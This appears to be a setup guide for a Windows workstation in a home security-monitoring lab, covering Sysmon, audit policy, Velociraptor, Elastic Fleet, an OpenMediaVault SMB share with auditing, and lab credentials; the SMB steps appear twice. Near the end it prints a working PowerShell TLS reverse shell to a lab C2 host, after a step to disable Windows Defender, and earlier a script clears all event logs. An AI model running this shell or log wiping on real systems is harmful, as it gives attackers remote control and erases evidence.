# Setup Windows Workstation

Based on your choice to use Windows 10 or Windows 11 in the initial host setup stage, you need to modify the `node.vm.box` in `vms/windows/users/config.rb`. Use the `vagrant box list` command to identify your Windows box name. By default, I will use the Windows 11 box (`windows-11-24h2-amd64`).

Run the VM (two VMs are predefined: `win-user-1` and `win-user-2`):

```bash
vagrant up win-user-1
```

While you wait for the Windows VM to initialize, you can configure [Guacamole using these instructions](/resources/docs/setup-guacamole.md).

Alternatively, you can use FreeRDP from localhost to connect to the Windows VM. First, install the service:

```bash
sudo apt install freerdp2-x11
```

Then use the command below to connect to the VM:

```bash
xfreerdp /u:vagrant /p:vagrant /v:192.168.225.21 /monitors:0 /multimon /port:3389
```

After you get access to the VM, change the network configuration to remove the gateway on the management interface. Select the appropriate network card and edit its settings.

<div align="center">
    <img alt="Windows network configuration" src="/resources/images/windows/workstation-network-properties.png" width="100%">
</div>  

Refresh the Guacamole page, because you will lose connection after changing the network configuration.

From the main host working directory, transfer `elasticsearch-ca.pem` to the `C:\` drive (if you have multiple Windows VMs, remember to change the IP address):

```bash
scp -i ~/.vagrant.d/insecure_private_key ./ansible/artifacts/elasticsearch-ca.pem vagrant@192.168.225.21:/c:/elasticsearch-ca.pem
```

Also tranfer the velociraptor executable

```bash
scp -i ~/.vagrant.d/insecure_private_key ./ansible/artifacts/velociraptor.exe vagrant@192.168.225.21:/c:/velociraptor.exe
```

Add the certificate to the trust store:

```powershell
certutil -addstore -f "Root" "C:\elasticsearch-ca.pem"
```

On the Windows VM we will use **Chocolatey** to install the required software. First, install Chocolatey itself. I recommend using Google Chrome to easily copy and paste commands to the VM. Open PowerShell as Administrator and run the following commands:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
```

Install software via Chocolatey:

```powershell
choco install git -y
choco install python --version=3.12.4 -y
choco install sysmon --version=15.14.0 --ignore-checksums -y
choco install filezilla -y
choco install googlechrome
choco install firefox -y
choco install visualstudio2019buildtools -y
choco install vcredist140 -y
choco install visualcpp-build-tools -y
choco install 7zip -y
```

Add Python to PATH (machine-wide):

```powershell
$currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
$newPath = $currentPath + ";C:\Python312;C:\Python312\Scripts"
[Environment]::SetEnvironmentVariable("Path", $newPath, "Machine")
```

The next step is to configure logging. Visit this page to [configure module logging for PowerShell](https://docs.splunk.com/Documentation/UBA/5.4.3/GetDataIn/AddPowerShell).

<!-- Next, configure logging on the Windows VM. Enable Script Block Logging -> Event ID 4104 in PowerShell/Operational:

```powershell
#New-Item -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord -Force
```

Enable Module Logging -> Event ID 4103:

```powershell
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -Force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -Name EnableModuleLogging -Value 1 -PropertyType DWord -Force
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames' -Force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames' -Name '*' -Value '*' -PropertyType String -Force
```

Ensure the event channel is enabled

```powershell
C:\Windows\System32\wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:true
``` -->

Update the audit policy. You can copy and paste the full script or create a PowerShell script file and transfer it via SCP. Audit settings are based on [this baseline](https://github.com/celeroon/win-audit-policy-settings):

```powershell
$AuditSettings = @{
    "Security System Extension"           = "Success"
    "System Integrity"                    = "Failure"
    "Security State Change"               = "Success"
    
    "Logon"                                = "Success,Failure"
    "Logoff"                               = "Success"
    "Account Lockout"                      = "Failure"
    "Special Logon"                        = "Success"
    "Other Logon/Logoff Events"            = "Success,Failure"
    "User / Device Claims"                 = "Success"
    "Group Membership"                     = "Success"

    "File System"                          = "Success,Failure"
    "Registry"                             = "Success,Failure"
    "Kernel Object"                        = "Failure"
    "Handle Manipulation"                  = "Success"
    "File Share"                           = "Success,Failure"
    "Other Object Access Events"           = "Success,Failure"
    "Detailed File Share"                  = "Success,Failure"
    "Removable Storage"                    = "Success,Failure"

    "Sensitive Privilege Use"              = "Success"

    "Process Creation"                     = "Success"
    "Process Termination"                  = "Success"
    "DPAPI Activity"                       = "Success,Failure"
    "Plug and Play Events"                 = "Success"

    "Audit Policy Change"                  = "Success"
    "Authentication Policy Change"         = "Success"
    "Authorization Policy Change"          = "Success"
    "Other Policy Change Events"           = "Success,Failure"

    "Security Group Management"            = "Success"
    "User Account Management"              = "Success,Failure"

    "Credential Validation"                = "Failure"
}

# Apply each audit policy setting
foreach ($Subcategory in $AuditSettings.Keys) {
    $AuditValue = $AuditSettings[$Subcategory]
    
    $SuccessFlag = if ($AuditValue -match "Success") { "/success:enable" } else { "/success:disable" }
    $FailureFlag = if ($AuditValue -match "Failure") { "/failure:enable" } else { "/failure:disable" }

    Write-Host "Configuring: $Subcategory -> $AuditValue" -ForegroundColor Yellow
    AuditPol /set /subcategory:"$Subcategory" $SuccessFlag $FailureFlag
}

Write-Host "Audit policies updated successfully!" -ForegroundColor Green
```

Install Velociraptor service

```powershell
C:\velociraptor.exe service install
```

Default usernames/passwords are preconfigured: `vagrant` / `vagrant`. Access Velociraptor at: `https://172.16.10.8:8889`

Download Sysmon config:

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml" -OutFile "C:\sysmonconfig.xml"
```

Clear logs before Sysmon installation:

```powershell
$logs = Get-EventLog -List

foreach ($log in $logs) {
    $entries = $log.Entries.Count
    $logName = $log.LogDisplayName
    if ($entries -gt 0) {
        Write-Host "Clearing $entries entries from $logName..."
        Clear-EventLog -LogName $log.Log
        Write-Host "Cleared!"
    } else {
        Write-Host "$logName has no entries to clear."
    }
}

Write-Host "Log clearing process completed."
```

Install Sysmon:

```powershell
C:\ProgramData\chocolatey\lib\sysmon\tools\sysmon64.exe -i C:\sysmonconfig.xml -accepteula
```

To install Elastic Agent, go to `https://172.16.10.5:5601` and navigate to the **Fleet** section. Click the **Add agent** button, select **Windows-Policy**, and at the bottom copy the script for `Windows x86_64`. Paste it into PowerShell (run as Administrator) and append `--force` to the command, or press `Y` during installation. After installation, you will see your Windows VM in the Fleet server section.

<div align="center">
    <img alt="Windows Elastic Agent" src="/resources/images/windows/elastic-agent.png" width="100%">
</div>  

It is recommended to update installed agent policies by navigating to `Fleet -> Agent policies -> Windows Policy`. In the `System` integration you can disable collecting Windows metrics if you want to save space on the ELK VM.

You may faced with `Unhealthy` status on Windows VM because it does not see Sysmon/Operational channel, you can reboot VM to fix it. 

Navigate to the `Fleet-Server-Policy` and in the top-right corner click **Add Integration**. Search for **NetFlow Records** and change `localhost` to `0.0.0.0` and the UDP port from `2055` to `9012`.

In the same `Fleet-Server-Policy`, install another integration — **Cisco IOS**. Disable collecting logs via TCP and for UDP change the host to `0.0.0.0` and the port to `9010`.

Now you can analyze dashboards by searching for **FortiGate** or **NetFlow** and review them.

<div align="center">
    <img alt="Elasticsearch Kibana NetFlow" src="/resources/images/windows/netflow-records.png" width="100%">
</div>  

To find branch Cisco router logs, open **Discover** and search for example:

```
data_stream.dataset: "cisco_ios.log"
```

Access the n8n GUI at `https://172.16.10.7` and set up an account. Provide your email address to receive a token that unlocks features for the Community Edition. Click the three dots next to your account in the lower left corner and go to `Settings`. Select `Enter activation key` and submit the token from your email.

Move back to the `Fleet-Server-Policy` integration tab and install `Custom UDP logs`. Change listen address to `0.0.0.0` and port to `9013`. Optionally you can change default namespace or integratio name, to something like `nas`. 

The n8n workflows will be presented later in the guidelines.

You can open a new tab to access DFIR-IRIS at `https://172.16.10.6` using the default credentials `administrator` / `vagrant`, if you followed the lab setup guide.

To set up **OpenMediaVault**, go to `http://172.16.20.100` and log in with the default credentials: `admin` / `openmediavault`.

At the start, you will be prompted to configure the dashboard. You can simply enable all widgets and save them.

In the left panel, navigate to the **Storage** section:

* **Disks:** Click on `dev/vdb (100GB)` and wipe it.
* **File Systems:** Create a new one, select **EXT4**, and in the **Device** section choose the 100GB disk. After creation, in the File Systems section click on *Mount an existing file system* (the play/start icon), select the disk, and click **Save**, then apply the pending configuration.
* **Shared Folders:** Enter a name for the shared folder (for example *lab*), select the file system you just created, the relative path will be filled automatically. For lab usage, leave the default permissions (*Admin: r/w, Users: r/w, Others: ro*). Save and apply the configuration.

Next, in the left panel go to **Services -> SMB/CIFS -> Settings**. At the top of the page, enable SMB, and for lab purposes I will switch to the SMB1 version. Also log level settings must be `None`, then save and apply changes.

In the **Shares** section, create a new share and select the previously created folder (*lab*). Additionally, enable *Audit file operations* and in the *Extra Options* put code below. Save and apply changes:

```bash
vfs objects = full_audit
full_audit:priority = NOTICE
full_audit:facility = DAEMON
full_audit:failure = connect
full_audit:success = connect disconnect unlinkat renameat mkdirat openat close read write
full_audit:prefix = %u|%I|%m|%S
```

(Optional) You can test applied parameters in the CLI

```bash
testparm -s
```

(Optional) Restart Samba

```bash
sudo systemctl restart smbd nmbd
```

In the left pannel go to the `Diagnostics` -> `System Logs` -> `Remote` and put host as `172.16.10.5` and port `9013`. Save and apply changes. 

Create rsyslog rule for `smbd_audit` in the CLI (connect via SSH to the VM)

```bash
sudo tee /etc/rsyslog.d/60-smb-audit-forward.conf >/dev/null <<'EOF'
if ($programname == "smbd_audit") then @@172.16.10.5:9013
EOF
```

Reload rsyslog

```bash
sudo systemctl restart rsyslog
```

Send a test message

```bash
logger -p daemon.notice -t smbd_audit "TEST audit forward"
```

You can debug audit

```bash
journalctl -f | grep -i smbd_audit`
```

Kibana filters that will be used in our lab to build queris (just as a reference)

* Definitive delete:

```bash
message: ("smbd_audit" AND "|unlinkat|")
```

* “Content change intent” (write open):

```bash
message: ("smbd_audit" AND "|openat|ok|w|")
```

* If you really need read opens (noisy):

```bash
message: ("smbd_audit" AND "|openat|ok|r|")
```

Next, in the left panel go to **Services -> SMB/CIFS -> Settings**. At the top of the page, enable SMB. For lab purposes, switch to **SMB1**. Set the log level to `None`, then save and apply changes.

In the **Shares** section, create a new share and select the previously created folder (*lab*). Additionally, enable *Audit file operations* and in *Extra Options* paste the code below. Save and apply changes:

```bash
vfs objects = full_audit
full_audit:priority = NOTICE
full_audit:facility = DAEMON
full_audit:failure = connect
full_audit:success = connect disconnect unlinkat renameat mkdirat openat close read write
full_audit:prefix = %u|%I|%m|%S
```

(Optional) Test the applied parameters in the CLI:

```bash
testparm -s
```

(Optional) Restart Samba:

```bash
sudo systemctl restart smbd nmbd
```

In the left panel, go to **Diagnostics -> System Logs -> Remote** and set the host to `172.16.10.5` and port to `9013`. Save and apply changes.

Create an rsyslog rule for `smbd_audit` in the CLI (connect via SSH to the VM):

```bash
sudo tee /etc/rsyslog.d/60-smb-audit-forward.conf >/dev/null <<'EOF'
if ($programname == "smbd_audit") then @@172.16.10.5:9013
EOF
```

Reload rsyslog:

```bash
sudo systemctl restart rsyslog
```

Send a test message:

```bash
logger -p daemon.notice -t smbd_audit "TEST audit forward"
```

Debug audit logs:

```bash
journalctl -f | grep -i smbd_audit
```

---

### Kibana filters (for lab queries, reference only):

* **Definitive delete:**

```bash
message: ("smbd_audit" AND "|unlinkat|")
```

* **“Content change intent” (write open):**

```bash
message: ("smbd_audit" AND "|openat|ok|w|")
```

* **Read opens (very noisy):**

```bash
message: ("smbd_audit" AND "|openat|ok|r|")
```

Go to **Users -> Users**, create a new user (for example *bob*), set and confirm the password, and select only the **user** group. Save. Then click on the *bob* user and go to **Shared folder permissions**. Since you only created one shared folder (*lab*), set its permissions to *Read/Write*. Save and apply.

Now, open Windows Explorer. You can:

* Go to the **Network** section (after enabling discovery) to find the NAS, named `NAS-1`, or
* Directly enter `\\172.16.20.100\lab` in the Explorer search bar.

You will be prompted for credentials — use the user account you created earlier.

<div align="center">  
    <img alt="Windows network share" src="/resources/images/windows/nas-1.png" width="100%">  
</div>  

If you want to implement the C2 server described in [Carrie Robers PowerShell script](/resources/docs/vm-setup/setup-c2-server.md), disable Windows Defender and use script

```bash
$socket = New-Object Net.Sockets.TcpClient('198.51.100.6', 443)
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
```

To access the lab email server (if you followed the tutorial), a DNS record is created in the FortiGate DNS Database.

<div align="center">  
    <img alt="Windows DNS" src="/resources/images/windows/dns-email.png" width="100%">  
</div>

On the Windows VM, open `https://email.lab.local` (or `https://203.0.113.6`) and log in with the credentials from the `.env` file (`MAIL_USER` / `MAIL_PASS`). You should see the test email that was sent by the Python script, including the attachment. Default credentials in the `.env` file are: `charlie.l@lab.local` / `supersecret123`.

<div align="center">  
    <img alt="Windows Email" src="/resources/images/windows/email.png" width="100%">  
</div>
